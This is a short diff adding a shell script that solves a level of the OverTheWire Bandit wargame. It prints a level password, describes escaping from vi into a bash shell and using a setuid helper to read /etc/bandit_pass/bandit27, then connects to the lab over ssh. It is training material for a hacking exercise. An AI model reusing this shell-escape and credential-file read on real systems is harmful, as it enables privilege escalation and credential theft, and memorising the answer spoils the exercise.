@@ -1,0 +1,5 @@
+echo Password: 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+echo type vi :set shell=/bin/bash then type :shell ./bandit27-do cat /etc/bandit_pass/bandit27
+sleep 4
+printf '\e[8;5;85t'
+ssh bandit26@bandit.labs.overthewire.org -p2220 
